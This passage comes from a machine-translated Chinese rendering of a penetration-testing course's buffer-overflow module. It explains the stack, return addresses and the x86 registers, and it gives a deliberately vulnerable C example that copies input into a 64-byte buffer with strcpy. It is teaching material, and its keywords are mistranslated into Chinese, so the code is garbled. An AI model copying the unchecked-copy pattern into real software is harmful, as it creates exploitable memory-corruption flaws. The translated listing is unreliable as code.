<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">347</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:31186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31236;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能还需要一个长期的、更动态的数据存储区，即</font></font></i></nobr></div>
<div style="position:absolute;top:31255;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">称为堆，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">294</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但由于我们专注于基于堆栈的缓冲区溢出，我们</font></font></i></nobr></div>
<div style="position:absolute;top:31275;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块不会讨论堆内存。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31337;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.1.2 函数返回机制</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当线程内的代码调用一个函数时，它必须知道一旦调用函数返回到哪个地址。</font></font></nobr></div>
<div style="position:absolute;top:31391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能完成。</font><font style="vertical-align: inherit;">这个“返回地址”（连同函数的参数和局部变量）</font></font></nobr></div>
<div style="position:absolute;top:31410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在堆栈中。</font><font style="vertical-align: inherit;">此数据集合与一个函数调用相关联，并存储在</font></font></nobr></div>
<div style="position:absolute;top:31429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈内存的一部分称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈帧</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">堆栈帧的示例如图所示</font></font></nobr></div>
<div style="position:absolute;top:31449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 179。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31646;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 179：堆栈上的返回地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当函数结束时，从栈中取出返回地址，用于恢复执行</font></font></nobr></div>
<div style="position:absolute;top:31697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流回到主程序或调用函数。</font></font></nobr></div>
<div style="position:absolute;top:31730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这在高层次上描述了这个过程，但我们必须更多地了解这是如何</font></font></nobr></div>
<div style="position:absolute;top:31749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际上是在 CPU 级别完成的。</font><font style="vertical-align: inherit;">这需要讨论 CPU</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寄存器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">295</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31783;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:31783;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CPU寄存器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了高效执行代码，CPU 维护并使用了一系列 9 个 32 位寄存器</font></font></nobr></div>
<div style="position:absolute;top:31841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在 32 位平台上）。</font><font style="vertical-align: inherit;">寄存器是小型、极高速的 CPU 存储位置，其中数据</font></font></nobr></div>
<div style="position:absolute;top:31860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以有效地读取或操作。</font><font style="vertical-align: inherit;">这九个寄存器，包括</font></font></nobr></div>
<div style="position:absolute;top:31879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些寄存器的高位和低位，如图 180 所示。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:32103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">294 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/desktop/wsw/heap</font></font></font></nobr></div>
<div style="position:absolute;top:32123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">295 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x86-architecture</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">348</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32620;left:373"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 180：X86 CPU 寄存器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寄存器名称是为 16 位架构建立的，然后用</font></font></nobr></div>
<div style="position:absolute;top:32670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32 位 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 平台的出现，因此在寄存器首字母缩略词中使用字母“E”。</font><font style="vertical-align: inherit;">每个寄存器可</font></font></nobr></div>
<div style="position:absolute;top:32689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含 32 位值（允许 0 到 0xFFFFFFFF 之间的值）或可能包含 16 位或 8 位</font></font></nobr></div>
<div style="position:absolute;top:32708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相应子寄存器中的值，如图 181 中的 EAX 寄存器所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32944;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 181：16 位和 8 位子寄存器</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33003;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于此模块的目的是演示缓冲区溢出，因此我们不会</font></font></i></nobr></div>
<div style="position:absolute;top:33022;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深入研究组装的细节，但会强调一些元素</font></font></i></nobr></div>
<div style="position:absolute;top:33041;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们的具体讨论很重要。</font><font style="vertical-align: inherit;">欲了解更多详情，或超越</font></font></i></nobr></div>
<div style="position:absolute;top:33061;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里讨论的基本技术，请参考这些在线资源。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">296</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33123;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2.1 通用寄存器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几个寄存器，包括 EAX、EBX、ECX、EDX、ESI 和 EDI，通常用作通用目的</font></font></nobr></div>
<div style="position:absolute;top:33176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寄存器来存储临时数据。</font><font style="vertical-align: inherit;">这个讨论还有更多内容（如各种</font></font></nobr></div>
<div style="position:absolute;top:33196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线资源</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">297</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，但用于我们目的的主要寄存器如下所述：</font></font></nobr></div>
<div style="position:absolute;top:33229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33229;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EAX（累加器）：算术和逻辑指令</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:33291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">296 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（教程点，2020 年），https://www.tutorialspoint.com/assembly_programming/</font></font></font></nobr></div>
<div style="position:absolute;top:33311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">297 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（SkullSecurity，2012 年），https://wiki.skullsecurity.org/Registers</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">349</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33568;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EBX（基）：内存地址的基指针</font></font></nobr></div>
<div style="position:absolute;top:33596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33596;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ECX（计数器）：循环、移位和旋转计数器</font></font></nobr></div>
<div style="position:absolute;top:33624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33624;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDX（数据）：I/O 端口寻址、乘法和除法</font></font></nobr></div>
<div style="position:absolute;top:33653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33653;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ESI（源索引）：字符串复制操作中数据和源的指针寻址</font></font></nobr></div>
<div style="position:absolute;top:33681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:33681;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDI（目标索引）：字符串复制操作中数据和目标的指针寻址</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33715;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2.2 ESP - 堆栈指针</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如前所述，堆栈用于存储数据、指针和参数。</font><font style="vertical-align: inherit;">由于</font></font></nobr></div>
<div style="position:absolute;top:33769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈是动态的，在程序执行过程中不断变化，ESP，堆栈指针，保持</font></font></nobr></div>
<div style="position:absolute;top:33789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过存储指针“跟踪”堆栈上最近引用的位置（堆栈顶部）</font></font></nobr></div>
<div style="position:absolute;top:33808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到它。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33870;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指针是对内存中地址（或位置）的引用。</font><font style="vertical-align: inherit;">当我们说一个</font></font></i></nobr></div>
<div style="position:absolute;top:33889;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寄存器“存储一个指针”或“指向”一个地址，这实质上意味着</font></font></i></nobr></div>
<div style="position:absolute;top:33909;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该寄存器正在存储该目标地址。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:33971;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2.3 EBP——基指针</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于堆栈在线程执行期间不断变化，因此对于</font></font></nobr></div>
<div style="position:absolute;top:34025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数来定位它自己的堆栈帧，它存储所需的参数、局部变量和</font></font></nobr></div>
<div style="position:absolute;top:34044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退货地址。</font><font style="vertical-align: inherit;">EBP，基指针，通过存储一个指向栈顶的指针来解决这个问题</font></font></nobr></div>
<div style="position:absolute;top:34064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当一个函数被调用时。</font><font style="vertical-align: inherit;">通过访问 EBP，一个函数可以很容易地从它的</font></font></nobr></div>
<div style="position:absolute;top:34083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行时拥有自己的堆栈帧（通过偏移量）。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34117;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.2.4 EIP——指令指针</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EIP，指令指针，对于我们的目的来说是最重要的寄存器之一</font></font></nobr></div>
<div style="position:absolute;top:34171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指向下一条要执行的代码指令。</font><font style="vertical-align: inherit;">由于 EIP 本质上是指导一个流</font></font></nobr></div>
<div style="position:absolute;top:34190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序，它是攻击者在利用任何内存损坏漏洞时的主要目标，例如</font></font></nobr></div>
<div style="position:absolute;top:34210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为缓冲区溢出。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2 缓冲区溢出演练</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将分析一个简单的易受攻击的应用程序，它无法正常执行</font></font></nobr></div>
<div style="position:absolute;top:34308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清理用户输入。</font><font style="vertical-align: inherit;">我们将分析应用程序源代码并通过传递发现</font></font></nobr></div>
<div style="position:absolute;top:34327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个专门为应用程序设计的参数，我们将能够复制我们控制的输入字符串</font></font></nobr></div>
<div style="position:absolute;top:34347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到较小的堆栈缓冲区，最终溢出其限制。</font><font style="vertical-align: inherit;">这种溢出会破坏数据</font></font></nobr></div>
<div style="position:absolute;top:34366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈，最终导致返回地址覆盖并完全控制 EIP 寄存器。</font></font></nobr></div>
<div style="position:absolute;top:34399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制 EIP 是创建成功缓冲区溢出的第一步。</font><font style="vertical-align: inherit;">在本模块中，我们将重点</font></font></nobr></div>
<div style="position:absolute;top:34418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在控制 EIP 和其他模块中，我们将解释如何将其用于任意代码</font></font></nobr></div>
<div style="position:absolute;top:34438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">350</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34756;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:34756;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例易受攻击代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34794;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下清单提供了一个非常基本的 C 源代码，用于易受缓冲区攻击的应用程序</font></font></nobr></div>
<div style="position:absolute;top:34813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">溢出。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;stdio.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:34865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#include &lt;string.h&gt;</font></font></nobr></div>
<div style="position:absolute;top:34899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">int main(int argc, char *argv[])</font></font></nobr></div>
<div style="position:absolute;top:34916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:34933;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符缓冲区[64]；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:34967;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 (argc &lt; 2)</font></font></nobr></div>
<div style="position:absolute;top:34984;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:35001;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">printf("错误 - 您必须至少提供一个参数\n");</font></font></nobr></div>
<div style="position:absolute;top:35035;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 1；</font></font></nobr></div>
<div style="position:absolute;top:35052;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:35086;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy（缓冲区，argv[1]）；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35119;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回0；</font></font></nobr></div>
<div style="position:absolute;top:35136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:35156;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 339 - 一个易受攻击的 C 函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使您以前从未接触过 C 代码，也应该很容易理解其中的逻辑</font></font></nobr></div>
<div style="position:absolute;top:35205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示在上面的列表中。</font><font style="vertical-align: inherit;">首先，值得注意的是，在C中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数被处理为</font></font></nobr></div>
<div style="position:absolute;top:35224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与其他所有功能相同；</font><font style="vertical-align: inherit;">它可以接收参数，将值返回给调用程序等。</font></font></nobr></div>
<div style="position:absolute;top:35243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">唯一的区别是它在进程启动时由操作系统本身“调用”。</font></font></nobr></div>
<div style="position:absolute;top:35276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数首先定义了一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的字符数组</font><font style="vertical-align: inherit;">，最多可容纳 64</font></font></nobr></div>
<div style="position:absolute;top:35295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">人物。</font><font style="vertical-align: inherit;">由于该变量是在函数内定义的，C 编译器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">298</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会将其视为局部</font><font style="vertical-align: inherit;">变量。</font></font></nobr></div>
<div style="position:absolute;top:35315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">299</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并将在堆栈上为其保留空间（64 字节）。</font><font style="vertical-align: inherit;">具体来说，这个内存空间将</font></font></nobr></div>
<div style="position:absolute;top:35334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在程序运行时执行期间</font><font style="vertical-align: inherit;">保留在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数堆栈帧中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:35396;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顾名思义，局部变量有一个局部作用域，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">300</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示它们</font></font></i></nobr></div>
<div style="position:absolute;top:35416;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只能在声明它们的函数或代码块中访问。</font></font></i></nobr></div>
<div style="position:absolute;top:35435;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相比之下，全局变量</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">301</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在程序 .data 部分，不同的</font></font></i></nobr></div>
<div style="position:absolute;top:35454;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有应用程序代码都可以全局访问的程序的内存区域。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:35627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">298 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Compiler</font></font></font></nobr></div>
